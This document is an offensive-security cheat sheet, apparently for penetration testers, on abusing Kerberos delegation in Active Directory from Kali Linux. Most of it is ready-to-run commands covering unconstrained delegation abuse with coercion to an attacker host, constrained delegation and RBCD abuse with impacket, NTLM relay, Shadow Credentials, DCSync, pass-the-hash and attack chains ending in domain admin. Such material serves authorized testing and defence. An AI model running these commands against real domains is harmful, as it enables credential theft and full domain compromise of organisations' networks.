---
title: "Delegation Attacks — From Kali"
weight: 4
tags: ["ad", "delegation", "kerberos", "kali", "impacket", "rbcd"]
---

## Quick Reference

| Attack | Tool | Required Privileges |
|---|---|---|
| Unconstrained Delegation Abuse | impacket, Responder, coercion tools | Compromise of delegated host |
| Constrained Delegation (KCD) | getST.py | Control of account with KCD configured |
| RBCD Setup + Abuse | addcomputer.py, rbcd.py, getST.py | GenericWrite or WriteDACL on target computer |
| Shadow Credentials | pywhisker.py, getnthash.py | WriteProperty on msDS-KeyCredentialLink |
| Coerce Authentication (PetitPotam) | PetitPotam.py | Valid domain credentials |
| Coerce Authentication (PrinterBug) | printerbug.py | Valid domain credentials |

---

## Delegation Overview

Kerberos delegation allows a service to impersonate users when accessing other services on their behalf. There are three types, each with different risk profiles and abuse paths.

### Types of Delegation

**Unconstrained Delegation**

The oldest and most dangerous form. A service is allowed to request a TGT on behalf of any user that authenticates to it. The user's TGT is embedded in the service ticket (ST) and forwarded to the service. Any account or computer with the `TrustedForDelegation` flag set can cache TGTs of authenticating users, and an attacker who compromises such a host can extract those TGTs.

- UAC flag: `TrustedForDelegation` (0x80000 / decimal 524288)
- LDAP attribute: `userAccountControl` with bit 19 set

**Constrained Delegation (KCD)**

Restricts delegation to a specific list of target services. The service can impersonate users but only to the services defined in `msDS-AllowedToDelegateTo`. The S4U2Self extension allows the service to obtain a service ticket for itself on behalf of any user, and S4U2Proxy then uses that to request a ticket for the target service.

- UAC flag (protocol transition): `TrustedToAuthForDelegation` (0x1000000 / decimal 16777216)
- LDAP attribute: `msDS-AllowedToDelegateTo`

**Resource-Based Constrained Delegation (RBCD)**

The delegation configuration is set on the *target* resource rather than the requesting service. The target resource's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute controls which principals can delegate to it. This is significant offensively because any principal with `GenericWrite` or `WriteDACL` over a computer object can configure RBCD without needing domain admin rights.

- LDAP attribute: `msDS-AllowedToActOnBehalfOfOtherIdentity`

### UAC Flag Summary

| Flag | Decimal | Hex | Meaning |
|---|---|---|---|
| TrustedForDelegation | 524288 | 0x80000 | Unconstrained delegation |
| TrustedToAuthForDelegation | 16777216 | 0x1000000 | Protocol transition (KCD) |
| NOT_DELEGATED | 1048576 | 0x100000 | Account is sensitive, cannot be delegated |

---

## Finding Delegation from Kali

### findDelegation.py (Impacket)

The quickest way to enumerate all delegation types at once:

```bash
findDelegation.py TARGET_DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP
```

With hash:

```bash
findDelegation.py TARGET_DOMAIN/USERNAME -hashes :NTLM_HASH -dc-ip DC_IP
```

With Kerberos ticket:

```bash
KRB5CCNAME=USERNAME.ccache findDelegation.py TARGET_DOMAIN/USERNAME -k -no-pass -dc-ip DC_IP
```

The output shows all accounts with unconstrained, constrained, or RBCD configured, along with their allowed services.

### ldapsearch — Unconstrained Delegation

Filter for accounts with `TrustedForDelegation` set (UAC bit 524288):

```bash
ldapsearch -x -H ldap://DC_IP \
  -D "TARGET_DOMAIN\USERNAME" \
  -w 'PASSWORD' \
  -b "DC=TARGET_DOMAIN,DC=local" \
  "(userAccountControl:1.2.840.113556.1.4.803:=524288)" \
  sAMAccountName userAccountControl
```

> **Note:** The OID `1.2.840.113556.1.4.803` is the LDAP bitwise AND matching rule. A match means the bit is set.

### ldapsearch — Constrained Delegation

Filter for accounts with `msDS-AllowedToDelegateTo` populated:

```bash
ldapsearch -x -H ldap://DC_IP \
  -D "TARGET_DOMAIN\USERNAME" \
  -w 'PASSWORD' \
  -b "DC=TARGET_DOMAIN,DC=local" \
  "(msDS-AllowedToDelegateTo=*)" \
  sAMAccountName msDS-AllowedToDelegateTo
```

### ldapsearch — RBCD

Filter for computer objects with `msDS-AllowedToActOnBehalfOfOtherIdentity` populated:

```bash
ldapsearch -x -H ldap://DC_IP \
  -D "TARGET_DOMAIN\USERNAME" \
  -w 'PASSWORD' \
  -b "DC=TARGET_DOMAIN,DC=local" \
  "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" \
  sAMAccountName msDS-AllowedToActOnBehalfOfOtherIdentity
```

### NetExec (nxc)

Enumerate machines with unconstrained delegation via SMB/LDAP:

```bash
nxc ldap DC_IP -u USERNAME -p 'PASSWORD' --trusted-for-delegation
```

```bash
nxc ldap DC_IP -u USERNAME -H NTLM_HASH --trusted-for-delegation
```

---

## Unconstrained Delegation Abuse

### Enumerate Computers with Unconstrained Delegation

Domain controllers always have unconstrained delegation configured — that is by design and not exploitable through this path. The interesting targets are *member servers* with the flag set.

```bash
findDelegation.py TARGET_DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP
```

Look for computer accounts (ending in `$`) in the output that are not domain controllers.

Alternatively with ldapsearch, combining unconstrained delegation filter and excluding DCs:

```bash
ldapsearch -x -H ldap://DC_IP \
  -D "TARGET_DOMAIN\USERNAME" \
  -w 'PASSWORD' \
  -b "DC=TARGET_DOMAIN,DC=local" \
  "(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))" \
  sAMAccountName dNSHostName
```

### Coercing DC Machine Account Authentication

The attack requires coercing the domain controller into authenticating to the compromised delegated host, so its TGT gets cached there. Several protocols can be abused for this.

**PetitPotam (MS-EFSRPC)**

Coerces NTLM authentication via the Encrypting File System Remote Protocol:

```bash
python3 PetitPotam.py ATTACKER_IP DC_IP
```

With credentials (some environments require authentication):

```bash
python3 PetitPotam.py -u USERNAME -p 'PASSWORD' -d TARGET_DOMAIN ATTACKER_IP DC_IP
```

**PrinterBug / SpoolSample (MS-RPRN)**

Abuses the Windows Print Spooler service:

```bash
python3 printerbug.py TARGET_DOMAIN/USERNAME:PASSWORD@DC_HOSTNAME ATTACKER_IP
```

Check if the Spooler service is running on the DC first:

```bash
rpcdump.py DC_IP | grep -i 'MS-RPRN\|MS-PAR'
```

**DFSCoerce (MS-DFSNM)**

Alternative coercion via the Distributed File System Namespace Management protocol:

```bash
python3 dfscoerce.py -u USERNAME -p 'PASSWORD' -d TARGET_DOMAIN ATTACKER_IP DC_HOSTNAME
```

### Capturing the TGT

**Option 1: Responder with a listener**

If you have already compromised the unconstrained delegation host and have code execution on it, use Responder or a Kerberos listener to capture the inbound TGT after coercion.

On the attack host, start Responder in analysis mode to avoid interfering with the network:

```bash
sudo responder -I eth0 -A
```

**Option 2: After compromising the delegated host**

Once you have shell access on the host with unconstrained delegation, use secretsdump to extract cached credentials and tickets:

```bash
secretsdump.py TARGET_DOMAIN/USERNAME:PASSWORD@COMPUTER_NAME.TARGET_DOMAIN
```

### Using a Captured TGT with Impacket

After extracting a TGT (as a `.ccache` file):

```bash
export KRB5CCNAME=/path/to/DC_HOSTNAME.ccache
```

Verify the ticket:

```bash
klist
```

Perform a DCSync with the DC machine account TGT:

```bash
secretsdump.py -k -no-pass DC_HOSTNAME.TARGET_DOMAIN -just-dc-ntlm
```

Get a shell on the DC:

```bash
psexec.py -k -no-pass TARGET_DOMAIN/DC_HOSTNAME\$@DC_HOSTNAME.TARGET_DOMAIN
```

> **Note:** When using the DC machine account TGT, you are impersonating the DC itself. This gives you DC-equivalent privileges including DCSync.

---

## Constrained Delegation (KCD) Abuse

### How S4U Works

Constrained delegation abuse relies on two Kerberos extensions:

1. **S4U2Self**: The compromised service account requests a service ticket *to itself* on behalf of any user (even one that never authenticated). This produces a forwardable TGS for the target user.
2. **S4U2Proxy**: The service uses that forwardable TGS to request a service ticket to one of its allowed target services, impersonating the user.

The `TrustedToAuthForDelegation` flag (protocol transition) allows S4U2Self to work regardless of how the user authenticated (or whether they authenticated at all). Without it, S4U2Self only produces non-forwardable tickets, limiting the attack.

### Basic KCD Abuse with getST.py

With password:

```bash
getST.py -spn SERVICE/DC_HOSTNAME \
  -impersonate Administrator \
  TARGET_DOMAIN/USERNAME:PASSWORD \
  -dc-ip DC_IP
```

With NTLM hash:

```bash
getST.py -spn SPN \
  -impersonate Administrator \
  -hashes :NTLM_HASH \
  TARGET_DOMAIN/USERNAME \
  -dc-ip DC_IP
```

With AES256 key (better OPSEC):

```bash
getST.py -spn SPN \
  -impersonate Administrator \
  -aesKey AES256_HASH \
  TARGET_DOMAIN/USERNAME \
  -dc-ip DC_IP
```

This produces `Administrator.ccache` in the current directory.

### Using the Service Ticket

```bash
export KRB5CCNAME=Administrator.ccache
```

Get a shell:

```bash
psexec.py -k -no-pass TARGET_DOMAIN/Administrator@DC_HOSTNAME.TARGET_DOMAIN
```

WMI shell:

```bash
wmiexec.py -k -no-pass TARGET_DOMAIN/Administrator@TARGET_HOSTNAME.TARGET_DOMAIN
```

SMB access:

```bash
smbclient.py -k -no-pass TARGET_DOMAIN/Administrator@DC_HOSTNAME.TARGET_DOMAIN
```

DCSync:

```bash
secretsdump.py -k -no-pass TARGET_DOMAIN/Administrator@DC_HOSTNAME.TARGET_DOMAIN -just-dc-ntlm
```

### Service Name Substitution

The KDC does not validate the `sname` field in a service ticket when it is presented to a service. This means a ticket obtained for `cifs/TARGET_HOSTNAME` can be rewritten to `ldap/TARGET_HOSTNAME` and the target service will accept it, provided the service account is the same.

Request a `cifs` ticket and rewrite it to `ldap`:

```bash
getST.py -spn cifs/DC_HOSTNAME \
  -altservice ldap \
  -impersonate Administrator \
  TARGET_DOMAIN/USERNAME:PASSWORD \
  -dc-ip DC_IP
```

This is useful when the KCD account is configured with `cifs` but you want LDAP access for DCSync, or `host` when you want `wsman` for WinRM.

Common substitutions:

| Original SPN | Altservice | Use |
|---|---|---|
| cifs/host | ldap | DCSync |
| cifs/host | host | PSExec |
| host/host | wsman | WinRM |
| http/host | ldap | DCSync |

### Multiple Service Substitution

```bash
getST.py -spn cifs/DC_HOSTNAME \
  -altservice ldap,cifs,host,http \
  -impersonate Administrator \
  TARGET_DOMAIN/USERNAME:PASSWORD \
  -dc-ip DC_IP
```

---

## RBCD (Resource-Based Constrained Delegation)

### Concept

With RBCD, the *target* resource controls which principals can delegate to it via `msDS-AllowedToActOnBehalfOfOtherIdentity`. This attribute stores a binary security descriptor containing a DACL. If you have `GenericWrite`, `WriteDACL`, `WriteProperty`, or `AllExtendedRights` over a computer object, you can write to this attribute and configure RBCD.

**Required primitives:**
- An account with `GenericWrite` (or equivalent) over a target computer object
- An attacker-controlled account with an SPN (a computer account works, as all computer accounts have SPNs by default)

### Step 1 — Add an Attacker-Controlled Computer Account

If you do not already control an account with an SPN, add a machine account using `addcomputer.py`. By default, domain users can add up to 10 machine accounts (MachineAccountQuota):

```bash
addcomputer.py \
  -computer-name 'ATTACKER_COMP$' \
  -computer-pass 'COMPUTER_PASS' \
  TARGET_DOMAIN/USERNAME:PASSWORD \
  -dc-ip DC_IP
```

Verify it was created:

```bash
nxc smb DC_IP -u USERNAME -p 'PASSWORD' --query "(sAMAccountName=ATTACKER_COMP$)"
```

> **Note:** Check the `ms-DS-MachineAccountQuota` attribute before trying. If it is 0, domain users cannot add machines and you need an existing account with an SPN.

### Step 2 — Configure RBCD on the Target

Set `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target computer to allow `ATTACKER_COMP$` to delegate to it:

```bash
rbcd.py \
  -f 'ATTACKER_COMP$' \
  -t TARGET_COMPUTER \
  -dc-ip DC_IP \
  TARGET_DOMAIN/USERNAME:PASSWORD
```

With hash:

```bash
rbcd.py \
  -f 'ATTACKER_COMP$' \
  -t TARGET_COMPUTER \
  -dc-ip DC_IP \
  -hashes :NTLM_HASH \
  TARGET_DOMAIN/USERNAME
```

Verify RBCD was configured:

```bash
ldapsearch -x -H ldap://DC_IP \
  -D "TARGET_DOMAIN\USERNAME" \
  -w 'PASSWORD' \
  -b "DC=TARGET_DOMAIN,DC=local" \
  "(sAMAccountName=TARGET_COMPUTER$)" \
  msDS-AllowedToActOnBehalfOfOtherIdentity
```

### Step 3 — S4U Chain to Get a Service Ticket

Request a service ticket impersonating Administrator on the target:

```bash
getST.py \
  -spn cifs/TARGET_COMPUTER.TARGET_DOMAIN \
  -impersonate Administrator \
  -dc-ip DC_IP \
  TARGET_DOMAIN/'ATTACKER_COMP$':COMPUTER_PASS
```

With hash if you have the NT hash of the computer account:

```bash
getST.py \
  -spn cifs/TARGET_COMPUTER.TARGET_DOMAIN \
  -impersonate Administrator \
  -hashes :NTLM_HASH \
  -dc-ip DC_IP \
  TARGET_DOMAIN/'ATTACKER_COMP$'
```

### Step 4 — Use the Ticket

```bash
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass TARGET_DOMAIN/Administrator@TARGET_COMPUTER.TARGET_DOMAIN
```

Access the C$ share:

```bash
smbclient.py -k -no-pass TARGET_DOMAIN/Administrator@TARGET_COMPUTER.TARGET_DOMAIN
```

Dump secrets:

```bash
secretsdump.py -k -no-pass TARGET_DOMAIN/Administrator@TARGET_COMPUTER.TARGET_DOMAIN
```

### Full RBCD via NTLM Relay (ntlmrelayx)

If you can coerce NTLM authentication from an account that has write access to a computer object (e.g., coercing a privileged user or a computer account), you can relay it to LDAP and configure RBCD automatically:

Start ntlmrelayx targeting LDAP on the DC, using `--delegate-access` to auto-configure RBCD:

```bash
sudo ntlmrelayx.py \
  -t ldap://DC_IP \
  --delegate-access \
  -smb2support
```

Coerce authentication from the target (e.g., using PetitPotam):

```bash
python3 PetitPotam.py ATTACKER_IP TARGET_IP
```

ntlmrelayx will create a new machine account and configure RBCD automatically. The output will show the machine account name and password. Then proceed with Step 3 above.

> **Note:** For relay to LDAP to work, LDAP signing must not be enforced. Relay to LDAPS works even with signing enforced if channel binding is not required.

### Cleanup After RBCD

If you want to clean up (authorized engagements):

```bash
rbcd.py \
  -f '' \
  -t TARGET_COMPUTER \
  -dc-ip DC_IP \
  TARGET_DOMAIN/USERNAME:PASSWORD
```

Remove the attacker-controlled computer account:

```bash
addcomputer.py \
  -computer-name 'ATTACKER_COMP$' \
  -delete \
  TARGET_DOMAIN/USERNAME:PASSWORD \
  -dc-ip DC_IP
```

---

## Shadow Credentials

### Concept

Shadow Credentials abuse the `msDS-KeyCredentialLink` attribute, which is used by Windows Hello for Business (WHfB) and PKINIT authentication. By adding a Key Credential (a certificate/key pair) to this attribute on a user or computer object, an attacker can authenticate as that principal using PKINIT and obtain a TGT, and from that a NTLM hash via U2U (User-to-User) Kerberos.

**Requirements:**
- `WriteProperty` on the `msDS-KeyCredentialLink` attribute of the target object
- `GenericWrite` on the target object covers this
- A Domain Controller running Windows Server 2016 or later (or with AD CS) to process PKINIT

### pywhisker — Add a Key Credential

```bash
pywhisker.py \
  -d TARGET_DOMAIN \
  -u USERNAME \
  -p 'PASSWORD' \
  --dc-ip DC_IP \
  --target TARGET_USER \
  --action add
```

With hash:

```bash
pywhisker.py \
  -d TARGET_DOMAIN \
  -u USERNAME \
  -H NTLM_HASH \
  --dc-ip DC_IP \
  --target TARGET_USER \
  --action add
```

On success, pywhisker outputs:
- The device ID (GUID) of the added credential
- A base64-encoded PFX certificate
- The PFX password

Save the base64 output — you need it for the next step.

### pywhisker — List and Remove Key Credentials

List existing key credentials on a target:

```bash
pywhisker.py \
  -d TARGET_DOMAIN \
  -u USERNAME \
  -p 'PASSWORD' \
  --dc-ip DC_IP \
  --target TARGET_USER \
  --action list
```

Remove a specific key credential by device ID:

```bash
pywhisker.py \
  -d TARGET_DOMAIN \
  -u USERNAME \
  -p 'PASSWORD' \
  --dc-ip DC_IP \
  --target TARGET_USER \
  --action remove \
  --device-id DEVICE_ID_GUID
```

Clear all key credentials on the target (use carefully):

```bash
pywhisker.py \
  -d TARGET_DOMAIN \
  -u USERNAME \
  -p 'PASSWORD' \
  --dc-ip DC_IP \
  --target TARGET_USER \
  --action clear
```

### Obtain NT Hash via PKINIT

Use the base64-encoded PFX certificate output from pywhisker to obtain the NT hash of the target user via PKINITtools:

```bash
getnthash.py \
  TARGET_DOMAIN/TARGET_USER \
  -pfx-base64 'BASE64_CERT' \
  -dc-ip DC_IP
```

If you saved the PFX to a file:

```bash
# Save PFX from base64
echo 'BASE64_CERT' | base64 -d > TARGET_USER.pfx

# Use gettgtpkinit.py to get a TGT first
python3 gettgtpkinit.py \
  TARGET_DOMAIN/TARGET_USER \
  -cert-pfx TARGET_USER.pfx \
  -pfx-pass 'PFX_PASSWORD' \
  -dc-ip DC_IP \
  TARGET_USER.ccache

# Then get the NT hash from the TGT AS-REP key
export KRB5CCNAME=TARGET_USER.ccache

python3 getnthash.py \
  TARGET_DOMAIN/TARGET_USER \
  -key AS_REP_ENC_KEY \
  -dc-ip DC_IP
```

### Using the NT Hash

Once you have the NT hash, perform Pass-the-Hash for lateral movement:

```bash
psexec.py -hashes :NTLM_HASH TARGET_DOMAIN/TARGET_USER@TARGET_IP
```

Or request a TGT:

```bash
getTGT.py TARGET_DOMAIN/TARGET_USER -hashes :NTLM_HASH -dc-ip DC_IP
export KRB5CCNAME=TARGET_USER.ccache
```

### Shadow Credentials on Computer Accounts

The same technique applies to computer accounts. If you have `GenericWrite` over a computer object, add a key credential to the computer account and authenticate as `COMPUTER_NAME$`:

```bash
pywhisker.py \
  -d TARGET_DOMAIN \
  -u USERNAME \
  -p 'PASSWORD' \
  --dc-ip DC_IP \
  --target 'COMPUTER_NAME$' \
  --action add
```

Obtain the computer's NT hash:

```bash
getnthash.py \
  TARGET_DOMAIN/'COMPUTER_NAME$' \
  -pfx-base64 'BASE64_CERT' \
  -dc-ip DC_IP
```

With the computer NT hash you can:
- Configure RBCD to impersonate users on that computer
- DCSync if the computer is a DC

---

## Chaining Delegation Attacks

### Unconstrained + Coercion → DCSync

1. Compromise a host with unconstrained delegation
2. Coerce DC authentication: `python3 PetitPotam.py ATTACKER_IP DC_IP`
3. Capture TGT on the compromised host
4. Export and use: `KRB5CCNAME=DC_HOSTNAME.ccache secretsdump.py -k -no-pass DC_HOSTNAME.TARGET_DOMAIN -just-dc-ntlm`

### GenericWrite → Shadow Credentials → RBCD → Domain Admin

1. GenericWrite on `COMPUTER_NAME$`
2. Add shadow credentials to `COMPUTER_NAME$`, obtain its NT hash
3. Use computer NT hash to configure RBCD on the DC
4. S4U chain to impersonate Administrator on the DC
5. Use ticket for DCSync

### RBCD → KCD Escalation

If the computer object you can write to is a service account with constrained delegation configured:

1. Configure RBCD on the target of that service account's KCD
2. S4U via RBCD gives you a ticket to the constrained delegation target
3. Chain with KCD's allowed service list

---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.
